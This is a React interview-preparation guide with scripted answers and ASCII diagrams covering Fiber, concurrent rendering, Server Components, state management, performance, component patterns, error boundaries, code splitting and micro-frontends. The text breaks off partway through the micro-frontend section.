
╔══════════════════════════════════════════════════════════════════════════════╗
║         REACT — SENIOR ENGINEER INTERVIEW GUIDE (15+ YRS EXPERIENCE)        ║
║                  Print-Ready | Conversational Script Format                  ║
╚══════════════════════════════════════════════════════════════════════════════╝

  Author: Sangam Mukherjee   |   Level: Staff / Principal / Architect
  Topics: Fiber, Concurrent, RSC, Patterns, Performance, Security, Testing

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  TABLE OF CONTENTS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

   1. Opening 90-Second Script ......................................... [P.01]
   2. React Fiber & Reconciliation ..................................... [P.02]
   3. Concurrent Mode & Priority Lanes ................................. [P.04]
   4. React Server Components .......................................... [P.06]
   5. State Management at Scale ........................................ [P.08]
   6. Performance Optimization ......................................... [P.10]
   7. Component Design Patterns ........................................ [P.12]
   8. Error Boundaries ................................................. [P.14]
   9. Code Splitting & Bundle Architecture ............................. [P.15]
  10. Micro-Frontend Architecture ...................................... [P.16]
  11. Testing Strategy ................................................. [P.17]
  12. React Query — Advanced ........................................... [P.18]
  13. TypeScript + React Patterns ...................................... [P.19]
  14. Security in React ................................................ [P.20]
  15. Accessibility .................................................... [P.21]
  16. React 19 — What's New ........................................... [P.22]
  17. Senior Trap Questions + Weak vs Strong Answers ................... [P.23]
  18. One-Page Cheat Sheet ............................................. [P.25]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.01]  OPENING 90-SECOND SCRIPT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  When asked "Tell me about your React experience":

  ┌─────────────────────────────────────────────────────────────────────────┐
  │ "I've been working with React since the class-component era, so I've    │
  │  seen it evolve from lifecycle methods and Redux to hooks, Concurrent   │
  │  Mode, and now Server Components. In my last role I was responsible     │
  │  for the frontend architecture of a product used by N users — that      │
  │  meant decisions around state management strategy, performance budget,  │
  │  micro-frontend boundaries, and CI/CD pipeline for the UI layer.        │
  │                                                                         │
  │  I tend to think about React less as a library and more as a rendering  │
  │  runtime — so I care a lot about how Fiber scheduling works, when to    │
  │  trust memoization vs when it's adding noise, and how to design         │
  │  components so the next engineer doesn't need to ask me questions.      │
  │  Where would you like to go deep first?"                                │
  └─────────────────────────────────────────────────────────────────────────┘

  WHY THIS WORKS: Shows breadth, names real problems (not just features),
  invites the interviewer to steer — gives you control of depth.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.02]  QUESTION: "Explain how the React Fiber reconciler works."
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  HOW TO SAY IT:
  ┌─────────────────────────────────────────────────────────────────────────┐
  │ "The core problem React solved in version 16 was that the old stack     │
  │  reconciler was completely synchronous — once it started re-rendering   │
  │  a component tree, it couldn't stop until it was done. If you had a    │
  │  large list or a deep tree, that could blow past the 16ms frame budget  │
  │  and cause visible jank. Fiber fixes this by decomposing render work    │
  │  into small units — one per component — so React can pause between      │
  │  units, let the browser handle input events, and then resume.           │
  │                                                                         │
  │  Let me draw the two phases..."                                         │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── OLD STACK RECONCILER (React < 16) ────────────────────────────────┐
  │                                                                         │
  │   renderApp()                                                           │
  │     └─► renderHeader()                                                  │
  │           └─► renderNav()                                               │
  │                 └─► renderNavItem() × 20                                │
  │     └─► renderBody()                                                    │
  │           └─► renderList()                                              │
  │                 └─► renderListItem() × 1000  ← CANNOT STOP HERE         │
  │                                                                         │
  │   ONE GIANT CALL STACK                                                  │
  │   60fps = 16ms budget per frame                                         │
  │   Large tree = 50ms = 3 dropped frames = janky scrolling               │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── FIBER RECONCILER (React 16+) ─────────────────────────────────────┐
  │                                                                         │
  │   FIBER NODE = a JS object, one per component                           │
  │   ┌──────────────────────────────────────────────────────────────┐      │
  │   │  {                                                            │      │
  │   │    type:         'div' | MyComponent | 'h1',                  │      │
  │   │    stateNode:    actual DOM node | class instance,            │      │
  │   │    child:    ───► first child fiber,                          │      │
  │   │    sibling:  ───► next sibling fiber,                         │      │
  │   │    return:   ───► parent fiber (NOT "parent" confusingly),    │      │
  │   │    pendingProps:  props about to be applied,                  │      │
  │   │    memoizedProps: props last applied,                         │      │
  │   │    effectTag:    PLACEMENT | UPDATE | DELETION,               │      │
  │   │    lanes:        priority bitmask  ← this enables scheduling  │      │
  │   │  }                                                            │      │
  │   └──────────────────────────────────────────────────────────────┘      │
  │                                                                         │
  │   FIBER TREE STRUCTURE:                                                 │
  │                                                                         │
  │   App ──child──► Header ──sibling──► Body                              │
  │    │               │                  │                                │
  │   return          return            return                             │
  │    │               │                  │                                │
  │   (null)          App               App                               │
  │                    │                  │                                │
  │                   child             child                              │
  │                    │                  │                                │
  │                   Nav              List ──child──► Item1 ─sibling─► Item2│
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── TWO PHASES ────────────────────────────────────────────────────────┐
  │                                                                         │
  │  PHASE 1: RENDER  (a.k.a "Reconciliation")    ← CAN BE INTERRUPTED     │
  │  ──────────────────────────────────────────                             │
  │  ● Walk the fiber tree unit by unit                                     │
  │  ● Compute what changed (diffing)                                       │
  │  ● Mark each fiber: UPDATE / PLACEMENT / DELETION                       │
  │  ● After each unit → check: "does the browser need the thread?"         │
  │      YES → pause, yield, resume later                                   │
  │      NO  → continue to next fiber                                       │
  │                                                                         │
  │  PHASE 2: COMMIT   (a.k.a "Paint")            ← CANNOT BE INTERRUPTED  │
  │  ──────────────────────────────────────────                             │
  │  ● Apply all DOM mutations at once                                      │
  │  ● Run useLayoutEffect (synchronous, before paint)                      │
  │  ● Run useEffect (async, after paint)                                   │
  │  ● Must be atomic — partial DOM updates = broken UI                     │
  │                                                                         │
  │  TIME SPENT:   Render phase = most of the work (can pause here)         │
  │                Commit phase = usually <1ms (never paused)               │
  └─────────────────────────────────────────────────────────────────────────┘

  HOW TO CLOSE:
  ┌─────────────────────────────────────────────────────────────────────────┐
  │ "The key insight is that Fiber turns rendering from a recursive call    │
  │  stack into a linked-list traversal. A linked list lets you stop at     │
  │  any node and remember where you are. That's what enables everything    │
  │  in Concurrent Mode — priorities, time-slicing, Suspense."             │
  └─────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.04]  QUESTION: "What is Concurrent Mode? How does startTransition work?"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  HOW TO SAY IT:
  ┌─────────────────────────────────────────────────────────────────────────┐
  │ "Concurrent Mode is the umbrella term for React 18's ability to         │
  │  prepare multiple versions of the UI at the same time and prioritize    │
  │  what the user sees first. Before React 18, every setState triggered    │
  │  an immediate synchronous re-render. Now React can say — this update    │
  │  is urgent, do it now. That other update can wait. I'll draw the        │
  │  priority system..."                                                    │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── PRIORITY LANES (React 18 internals) ──────────────────────────────┐
  │                                                                         │
  │   LANE                    WHAT TRIGGERS IT         EXAMPLE              │
  │   ─────────────────────   ────────────────────     ────────────────     │
  │   SyncLane (highest)      onClick, onKeyDown        Button click         │
  │   InputContinuousLane     onInput, onScroll         Typing in search     │
  │   DefaultLane             Normal setState()         Data loaded          │
  │   TransitionLane          startTransition()         Filter 10k rows      │
  │   RetryLane               Suspense retry            Refetch on error     │
  │   IdleLane   (lowest)     requestIdleCallback       Background prefetch  │
  │                                                                         │
  │   USER TYPES in search box (InputContinuousLane)                        │
  │        ↓                                                                │
  │   React sees pending filter re-render (TransitionLane)                  │
  │        ↓                                                                │
  │   INTERRUPT the filter render                                           │
  │        ↓                                                                │
  │   Process the keystroke FIRST (higher priority)                         │
  │        ↓                                                                │
  │   Resume / restart the filter render with new input value               │
  │                                                                         │
  │   Result: typing feels instant, filter catches up when idle             │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── THREE CONCURRENT APIS COMPARED ───────────────────────────────────┐
  │                                                                         │
  │   API                    USE CASE                  GIVES YOU            │
  │   ────────────────────   ────────────────────────  ─────────────────    │
  │   startTransition(fn)    You control the setState   Nothing (fire+forget)│
  │   useTransition()        Same + need loading UI     [isPending, start]  │
  │   useDeferredValue(val)  You receive a prop/value   Lagged copy of val  │
  │                           you can't control                             │
  │                                                                         │
  │   EXAMPLE — search filter:                                              │
  │                                                                         │
  │   // OPTION 1: useTransition (you own the setState)                     │
  │   const [isPending, startTransition] = useTransition();                 │
  │   const handleChange = (e) => {                                         │
  │     setQuery(e.target.value);              // urgent — instant          │
  │     startTransition(() => {                                             │
  │       setFilteredList(filter(data, e.target.value)); // deferrable      │
  │     });                                                                 │
  │   };                                                                    │
  │   {isPending && <Spinner />}               // show while filtering      │
  │                                                                         │
  │   // OPTION 2: useDeferredValue (you receive query as a prop)           │
  │   function FilteredList({ query }) {                                    │
  │     const deferredQuery = useDeferredValue(query);                      │
  │     // renders twice: once with old query (instant),                    │
  │     // then with new query when idle                                    │
  │     return <List items={filter(data, deferredQuery)} />;                │
  │   }                                                                     │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘

  HOW TO CLOSE:
  ┌─────────────────────────────────────────────────────────────────────────┐
  │ "The mental model I use is: startTransition says 'I'm okay if this     │
  │  update is slow.' useDeferredValue says 'Show me the old result while   │
  │  the new one is cooking.' They're both tools to keep the UI responsive  │
  │  while expensive work happens in the background."                       │
  └─────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.06]  QUESTION: "Explain React Server Components. How is it different from SSR?"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  HOW TO SAY IT:
  ┌─────────────────────────────────────────────────────────────────────────┐
  │ "This is one where people often conflate SSR and RSC, so let me draw    │
  │  the distinction clearly. SSR renders components to HTML on the server  │
  │  once per request — but you still ship all that component JS to the     │
  │  client for hydration. RSC goes further: Server Components never send   │
  │  any JS to the client at all — they output a serialized React tree      │
  │  that the client shell stitches in. Zero JS bundle cost for those       │
  │  components, and they can be async by default — await a DB call right   │
  │  in the component body."                                                │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── SSR vs RSC vs CSR COMPARISON ─────────────────────────────────────┐
  │                                                                         │
  │                    CSR           SSR          RSC (Next.js 13+)         │
  │   ─────────────   ──────────     ──────────   ─────────────────         │
  │   Runs on         Browser        Server       Server (never browser)    │
  │   JS to client    Full bundle    Full bundle  ZERO (for SC)             │
  │   Can await DB?   No (needs API) No (needs API) YES — direct            │
  │   Has hooks?      Yes            Yes           NO                       │
  │   Has events?     Yes            No (server)   NO                       │
  │   Initial HTML    Empty <div>    Full HTML     Full HTML                │
  │   SEO             Poor           Good          Good                     │
  │   Interactivity   Full           After hydrate Client only ('use client')│
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── RSC COMPONENT TREE ────────────────────────────────────────────────┐
  │                                                                         │
  │   PAGE (Server Component — default)                                     │
  │    ├── Header (Server — reads DB for user name, zero JS sent)           │
  │    ├── ProductList (Server — await fetch('/api/products'), zero JS)     │
  │    │     └── ProductCard (Server — pure display, zero JS)               │
  │    ├── AddToCartButton (Client — 'use client', needs onClick)           │
  │    │     └── [shipped as JS bundle to browser]                          │
  │    └── ReviewSection (Server — reads DB, zero JS)                       │
  │          └── LikeButton (Client — needs click handler)                  │
  │                                                                         │
  │   TOTAL COMPONENTS: 6                                                   │
  │   JS shipped to browser: 2 components only (AddToCartButton, LikeButton)│
  │   Without RSC: ALL 6 components would be in the JS bundle               │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── THE ONE RULE THAT TRIPS PEOPLE ───────────────────────────────────┐
  │                                                                         │
  │   Server Component CAN contain Client Components ✅                     │
  │   Client Component CANNOT import Server Components ❌                   │
  │                                                                         │
  │   // Works — pass Server Component as children prop                     │
  │   // ServerComp.tsx                                                     │
  │   export default function Page() {                                      │
  │     return (                                                            │
  │       <ClientShell>          {/* Client Component */}                   │
  │         <ServerData />       {/* Server Component — passed as prop */}  │
  │       </ClientShell>                                                    │
  │     );                                                                  │
  │   }                                                                     │
  │                                                                         │
  │   WHY: Client Components are bundled — they cannot import something     │
  │   that only exists at request time on the server.                       │
  │   But children is just React elements (already resolved) — fine.        │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘

  HOW TO CLOSE:
  ┌─────────────────────────────────────────────────────────────────────────┐
  │ "My rule of thumb: start everything as a Server Component by default.  │
  │  Only add 'use client' when you need useState, useEffect, event         │
  │  handlers, or browser APIs. That way you're shipping the minimum JS     │
  │  necessary and keeping the data-fetching close to the database."        │
  └─────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.08]  QUESTION: "How do you choose your state management approach?"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  HOW TO SAY IT:
  ┌─────────────────────────────────────────────────────────────────────────┐
  │ "The biggest mistake I see teams make is treating all state the same.   │
  │  I categorize state into four buckets before choosing a tool:           │
  │  server state, global UI state, local component state, and URL state.   │
  │  Each has different characteristics and different best tools."          │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── STATE CATEGORY DECISION TREE ─────────────────────────────────────┐
  │                                                                         │
  │   Is it from a server / async?                                          │
  │       YES → React Query (TanStack Query)                                │
  │            [caching, stale-while-revalidate, retry, optimistic]         │
  │            DO NOT PUT SERVER DATA IN REDUX — it duplicates cache logic  │
  │                                                                         │
  │   Is it UI-only and local to one component?                             │
  │       YES → useState / useReducer (no library needed)                   │
  │                                                                         │
  │   Is it in the URL? (filter, pagination, selected tab)                  │
  │       YES → URL params (survives refresh, shareable, back button works) │
  │                                                                         │
  │   Is it global UI state?                                                │
  │       ├─ Small, rarely updated (theme, auth, locale)?                   │
  │       │     YES → Context + useReducer                                  │
  │       ├─ Frequently updated, many components?                           │
  │       │     YES → Zustand (simple) or Redux Toolkit (large teams)       │
  │       └─ Atom-level (spreadsheet cells, game state, real-time)?         │
  │             YES → Jotai or Recoil                                       │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── CONTEXT PERFORMANCE TRAP — ALWAYS DRAW THIS ──────────────────────┐
  │                                                                         │
  │   BAD — one Context with many values                                    │
  │   ─────────────────────────────────                                     │
  │   const AppCtx = createContext({ user, theme, notifications });         │
  │                                                                         │
  │                 AppCtx.Provider (value={user,theme,notifs})             │
  │                /               |               \                        │
  │          UserAvatar       ThemeToggle       NotifBadge                  │
  │          (needs user)     (needs theme)     (needs notifs)              │
  │                                                                         │
  │   notification arrives → value object is NEW → ALL THREE re-render      │
  │   UserAvatar re-renders even though user didn't change ❌                │
  │                                                                         │
  │   GOOD — split by update frequency                                      │
  │   ─────────────────────────────────                                     │
  │   const UserCtx  = createContext(user);         // changes rarely       │
  │   const ThemeCtx = createContext(theme);        // changes rarely       │
  │   const NotifCtx = createContext(notifications);// changes often        │
  │                                                                         │
  │   notification arrives → only NotifBadge re-renders ✅                  │
  │                                                                         │
  │   ALSO: stabilize value with useMemo                                    │
  │   const value = useMemo(() => ({ user, updateUser }), [user]);          │
  │   // Without this: every parent render = new object = all consumers     │
  │   //               re-render even if user didn't change                 │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘

  HOW TO CLOSE:
  ┌─────────────────────────────────────────────────────────────────────────┐
  │ "In practice, most apps I've built need React Query for server state,  │
  │  Zustand for a handful of global client state slices, and useState      │
  │  everywhere else. Redux is worth it when you have a large team that     │
  │  needs strict conventions, devtools, and time-travel debugging."        │
  └─────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.10]  QUESTION: "We have a 10,000-row table that's slow. Walk me through it."
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  HOW TO SAY IT:
  ┌─────────────────────────────────────────────────────────────────────────┐
  │ "First thing I'd do is NOT touch the code. I'd profile first — React   │
  │  DevTools Profiler to see which components are re-rendering and how     │
  │  long they take, Chrome Performance tab to find long tasks. You'd be    │
  │  surprised how often the fix is in a completely different place than    │
  │  the symptom. Once I know what's slow, I work through these layers..."  │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── PERFORMANCE INVESTIGATION LADDER ─────────────────────────────────┐
  │                                                                         │
  │   LEVEL 1: PROFILING (always first)                                     │
  │   ─────────────────────────────────                                     │
  │   React DevTools → Profiler tab → record interaction                    │
  │   Look for: flamechart bars that are wide and deep                      │
  │   Look for: components with "(Why did this render?)" badge              │
  │   Chrome Perf → Long Tasks > 50ms → which JS is blocking?              │
  │                                                                         │
  │   LEVEL 2: VIRTUALIZATION (biggest wins, do this first)                 │
  │   ─────────────────────────────────                                     │
  │   10,000 rows rendered = 10,000 DOM nodes                               │
  │   With react-window or @tanstack/react-virtual:                         │
  │                                                                         │
  │   ┌─────────────────────────────────────────────────────────┐           │
  │   │  VIEWPORT (600px tall, rows = 40px each)                │           │
  │   │  ┌────────────────────────────┐                         │           │
  │   │  │  Row 5  ← visible          │  DOM nodes              │           │
  │   │  │  Row 6  ← visible          │  in memory: ~20         │           │
  │   │  │  Row 7  ← visible          │  (visible + buffer)     │           │
  │   │  │  Row 8  ← visible          │                         │           │
  │   │  └────────────────────────────┘                         │           │
  │   │  Row 1-4 and Row 9-10000 exist only as                  │           │
  │   │  absolute-positioned spacer — NO DOM NODES               │           │
  │   └─────────────────────────────────────────────────────────┘           │
  │                                                                         │
  │   LEVEL 3: MEMOIZATION (selective, not everywhere)                      │
  │   ─────────────────────────────────                                     │
  │   Memo on Row component — only re-renders when row data changes         │
  │   const Row = React.memo(({ data }) => <tr>...</tr>);                   │
  │   WITHOUT memo: parent re-renders → all 10k rows re-render              │
  │   WITH memo: parent re-renders → only changed rows re-render            │
  │                                                                         │
  │   LEVEL 4: STATE COLOCATION (architectural fix)                         │
  │   ─────────────────────────────────                                     │
  │   WRONG: selectedRowId in top-level state                               │
  │   Table re-renders → all rows re-render to check if selected            │
  │                                                                         │
  │   RIGHT: selectedRowId in a Zustand atom or URL param                   │
  │   Only the previously-selected and newly-selected row re-render         │
  │                                                                         │
  │   LEVEL 5: COMPUTATION OFFLOADING (for filter/sort logic)               │
  │   ─────────────────────────────────                                     │
  │   const sorted = useMemo(() => heavySort(data), [data, sortKey]);       │
  │   // Without this: every render re-sorts 10k rows                       │
  │   // For very heavy: move to Web Worker                                 │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── useCallback / useMemo — WHEN THEY DON'T HELP ─────────────────────┐
  │                                                                         │
  │   MYTH: "Wrap everything in useCallback for performance"                │
  │   TRUTH: useCallback is useless unless:                                 │
  │                                                                         │
  │   Scenario A — passed to React.memo child ✅                            │
  │   Parent → useCallback(fn) → memo(Child) → Child won't re-render       │
  │   if fn reference is stable                                              │
  │                                                                         │
  │   Scenario B — in useEffect deps ✅                                     │
  │   useEffect(() => { fn() }, [fn])                                       │
  │   Without useCallback: fn is new every render → infinite loop           │
  │                                                                         │
  │   Scenario C — standalone, not passed anywhere ❌                       │
  │   const handler = useCallback(() => doX(), []);                         │
  │   Used only in this component's JSX directly                            │
  │   → adds overhead (create deps array, compare) with zero benefit        │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.12]  QUESTION: "Compare Compound Components, Render Props, and HOCs."
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  HOW TO SAY IT:
  ┌─────────────────────────────────────────────────────────────────────────┐
  │ "These are three solutions to the same problem: sharing logic or        │
  │  behavior across components without repeating it. They evolved over     │
  │  time — HOCs came first in the class era, Render Props fixed some HOC   │
  │  problems, and Compound Components plus custom hooks are the idiomatic  │
  │  answer in 2024. Let me walk through when I'd pick each one."           │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── PATTERN COMPARISON ────────────────────────────────────────────────┐
  │                                                                         │
  │   1. COMPOUND COMPONENTS (preferred for UI libraries)                   │
  │   ───────────────────────────────────────────────────                   │
  │   Share implicit state via Context. Consumer controls structure.        │
  │                                                                         │
  │   <Tabs defaultValue="profile">              // parent manages state    │
  │     <Tabs.List>                                                         │
  │       <Tabs.Trigger value="profile">Profile</Tabs.Trigger>              │
  │       <Tabs.Trigger value="settings">Settings</Tabs.Trigger>            │
  │     </Tabs.List>                                                        │
  │     <Tabs.Content value="profile"><ProfileForm /></Tabs.Content>        │
  │     <Tabs.Content value="settings"><SettingsForm /></Tabs.Content>      │
  │   </Tabs>                                                               │
  │                                                                         │
  │   HOW: Tabs creates Context { activeTab, setActiveTab }                 │
  │        Tabs.Trigger reads it and calls setActiveTab on click            │
  │        Tabs.Content reads it and renders only when value matches        │
  │                                                                         │
  │   USE WHEN: Design system (Select, Accordion, Dialog, Combobox)         │
  │             Consumer should control the rendering structure             │
  │                                                                         │
  │   ─────────────────────────────────────────────────────────────         │
  │   2. RENDER PROPS (still valid for list rendering)                      │
  │   ──────────────────────────────────────────────                        │
  │   Pass render logic as a function prop. Component owns data, you own    │
  │   the template.                                                         │
  │                                                                         │
  │   <DataTable                                                            │
  │     data={users}                                                        │
  │     renderRow={(user) => (                                              │
  │       <tr key={user.id}>                                                │
  │         <td>{user.name}</td>                                            │
  │         <td><StatusBadge status={user.status} /></td>                   │
  │       </tr>                                                             │
  │     )}                                                                  │
  │   />                                                                    │
  │                                                                         │
  │   USE WHEN: react-window (renderItem), react-table (cell renderers)     │
  │             Library controls structure, consumer controls content       │
  │             Custom hooks can't replace this (hooks can't return JSX     │
  │             that varies structurally per call site)                     │
  │                                                                         │
  │   ─────────────────────────────────────────────────────────────         │
  │   3. HOC — Higher Order Component                                       │
  │   ──────────────────────────────                                        │
  │   Takes a component, returns a new component with added behavior.       │
  │                                                                         │
  │   const AuthPage = withAuth(DashboardPage);                             │
  │   const TrackedButton = withAnalytics(Button, 'cta_click');             │
  │                                                                         │
  │   USE WHEN: Cross-cutting concerns (auth guards, analytics, feature     │
  │             flags) where you wrap at the routing layer                  │
  │   AVOID:    HOC chains (5 HOCs deep = prop collision hell)              │
  │             Prefer custom hooks for logic sharing in new code           │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.14]  QUESTION: "How do Error Boundaries work, and what are their limits?"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ┌──── ERROR BOUNDARY FLOW ───────────────────────────────────────────────┐
  │                                                                         │
  │   Error thrown during render in child component                         │
  │              │                                                          │
  │              ▼                                                          │
  │   React walks UP the tree looking for nearest Error Boundary            │
  │              │                                                          │
  │              ▼                                                          │
  │   getDerivedStateFromError(error)  → set { hasError: true }             │
  │              │                                                          │
  │              ▼                                                          │
  │   componentDidCatch(error, info)   → log to Sentry/Datadog              │
  │              │                                                          │
  │              ▼                                                          │
  │   Render fallback UI instead of crashed subtree                         │
  │   Rest of app continues working ✅                                       │
  │                                                                         │
  │   PLACEMENT STRATEGY:                                                   │
  │                                                                         │
  │   <App>                                                                 │
  │     <ErrorBoundary fallback={<AppError />}>     ← top-level catch-all  │
  │       <Router>                                                          │
  │         <Route path="/dashboard">                                       │
  │           <ErrorBoundary fallback={<DashError />}>  ← route level      │
  │             <Dashboard>                                                 │
  │               <ErrorBoundary fallback={<CardError />}>  ← granular     │
  │                 <RevenueCard />     ← error here only kills this card   │
  │               </ErrorBoundary>                                          │
  │             </Dashboard>                                                │
  │           </ErrorBoundary>                                              │
  │         </Route>                                                        │
  │       </Router>                                                         │
  │     </ErrorBoundary>                                                    │
  │   </App>                                                                │
  │                                                                         │
  │   WHAT THEY DON'T CATCH:                                                │
  │   ✗ async errors (setTimeout, fetch.catch)                              │
  │   ✗ Event handler errors (use try/catch inside)                         │
  │   ✗ Errors in the boundary itself                                       │
  │   ✗ SSR errors                                                          │
  │                                                                         │
  │   WORKAROUND for async errors:                                          │
  │   const [error, setError] = useState(null);                             │
  │   if (error) throw error;  // ← pushes into nearest ErrorBoundary       │
  │   fetchSomething().catch(e => setError(e));                             │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.15]  QUESTION: "How do you architect code splitting in a large app?"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ┌──── SPLITTING LEVELS ──────────────────────────────────────────────────┐
  │                                                                         │
  │   LEVEL 1: ROUTE SPLITTING (always do this)                             │
  │   ────────────────────────────────────────                              │
  │   Without: one 2MB bundle downloaded before any page renders            │
  │   With:    each route ~30-100KB, only current route downloaded          │
  │                                                                         │
  │   const Dashboard = lazy(() => import('./pages/Dashboard'));            │
  │   const Profile   = lazy(() => import('./pages/Profile'));              │
  │   <Suspense fallback={<PageLoader />}>                                  │
  │     <Routes>                                                            │
  │       <Route path="/dashboard" element={<Dashboard />} />              │
  │     </Routes>                                                           │
  │   </Suspense>                                                           │
  │                                                                         │
  │   LEVEL 2: HEAVY COMPONENT SPLITTING (modal editors, charts)            │
  │   ───────────────────────────────────────────────────────               │
  │   const RichEditor = lazy(() => import('./RichEditor')); // 500KB lib   │
  │   // Only loaded when user opens the editor modal                       │
  │                                                                         │
  │   LEVEL 3: VENDOR CHUNK STRATEGY (webpack/vite config)                  │
  │   ──────────────────────────────────────────────────                    │
  │   react + react-dom  → vendor chunk  (rarely changes, long cache TTL)   │
  │   lodash / date-fns  → util chunk    (changes with library upgrades)    │
  │   chart libraries    → chart chunk   (user only downloads if they visit │
  │                                       analytics page)                   │
  │                                                                         │
  │   WHAT NOT TO LAZY LOAD:                                                │
  │   ✗ Components visible in the initial viewport                          │
  │     → causes layout shift + worse LCP (Core Web Vital)                 │
  │   ✓ Components below the fold, in tabs, in modals, conditional          │
  │                                                                         │
  └─────────────────────────────────────────────────────────────────────────┘


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[P.16]  QUESTION: "How would you split a large app into micro-frontends?"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  HOW TO SAY IT:
  ┌─────────────────────────────────────────────────────────────────────────┐
  │ "I've evaluated a few approaches here. Module Federation is the one     │
  │  I'd recommend for a React ecosystem because you get true independent   │
  │  deploys with shared dependencies handled automatically. Let me draw    │
  │  the architecture..."                                                   │
  └─────────────────────────────────────────────────────────────────────────┘

  ┌──── MODULE FEDERATION ARCHITECTURE ───────────────────────────────────┐
  │                                                                         │
  │   ┌─────────────────────────────────────────────────────────────────┐  │
  │   │                    SHELL APP (HOST)                              │  │
  │   │   - Routing                                                      │  │
  │   │   - Authentication                                               │  │
  │   │   - Design System                                                │  │
  │   │   - Layout Shell                                                 │  │
  │   └──────────────────────────────────────────────────────────────────┘  │
  │           │ imports at runtime (not build time)                         │
  │    ┌──────┼────────────────┐                                           │
  │    ▼      ▼                ▼                                           │
  │  ┌──────────┐  ┌──────────┐  ┌──────────┐                             │
  │  │  MFE:    │  │  MFE:    │  │  MFE:    │                             │
  │  │  Orders  │  │  Catalog │  │  Profile │                             │
  │  │          │  │          │  │          │                             │
  │  │ /orders/ │  │ /catalog/│  │ /profile/│                             │
  │  │ Own repo │  │ Own repo │  │ Own repo │                             │
  │  │ Own CI   │  │ Own CI   │  │ Own CI   │                             │
  │  │ Own team │  │ Own team │  │ Own team │                             │
  │  └──────────┘  └──────────┘  └──────────┘                             │
  │                                                                         │
  │   SHARED (singleton — one copy loaded):                                 │
  │   react, react-dom, design-system, auth-utils                           │
  │                                                                         │
  │   HARD PROBLEMS AND HOW I SOLVE THEM:                                   │
  │   ─────────────────────────────────────                                 │
  │   Shared state    → URL params + custom events / broadcast channel      │
  │   Auth            → Shell owns token, passes via prop or context        │
